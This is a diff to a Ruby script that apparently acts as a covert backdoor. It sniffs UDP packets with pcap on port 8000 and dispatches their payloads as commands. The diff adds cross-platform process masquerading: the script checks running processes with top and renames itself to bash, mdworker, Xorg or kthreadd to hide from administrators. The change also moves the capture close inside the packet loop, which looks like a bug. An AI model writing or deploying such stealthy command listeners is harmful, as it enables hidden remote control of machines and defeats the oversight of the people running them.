@@ -36,6 +36,7 @@ optparse.parse!
 
 # Listening device
 dev = options[:dev]? options[:dev] : Pcap.lookupdev
+p dev
 # Listening port
 port = options[:port]? options[:port] : 8000
 
@@ -47,18 +48,25 @@ port = options[:port]? options[:port] : 8000
 # List in order of preference, as we'll choose the first one that is running on the machine. If none
 # are found, the first process name will be used - list wisely.
 covers = ['bash','mdworker','Xorg','kthreadd','gnome-terminal']
-top = `top -l 1`
 
-# If none of the processes are found running, we'll just go with the first one
-$0 = covers[0]
+begin
+	# Run top only once, Mac top uses -l, Linux uses -n
+	top = (RUBY_PLATFORM.downcase.include?("darwin")) ? `top -l 1` : `top -n 1`;
 
-# Is there a process running that we can mask ourselves with? Choose the first one we find.
-covers.each do |cover|
-	if top.match cover
-		# Change the process name
-		$0 = cover
-		break
+	# If none of the processes are found running, we'll just go with the first one
+	$0 = covers[0]
+
+	# Is there a process running that we can mask ourselves with? Choose the first one we find.
+	covers.each do |cover|
+		if top.match cover
+			# Change the process name
+			$0 = cover
+			break
+		end
 	end
+rescue
+	# If it fails, we'll just go with the first one
+	$0 = covers[0]
 end
 
 # ---------------------------------------------------------
@@ -66,14 +74,14 @@ end
 # ---------------------------------------------------------
 
 cap = Pcap::Capture.open_live(dev)
-cap.setfilter("udp")
+cap.setfilter('udp src port 8000')
 
 cap.loop do |pkt|
 	p "Command receievd from " + pkt.ip_src.to_s
 	p Dispatch.new pkt.udp_data.to_s
-end
 
-cap.close
+	cap.close
+end
 
 # ---------------------------------------------------------
 # Fin
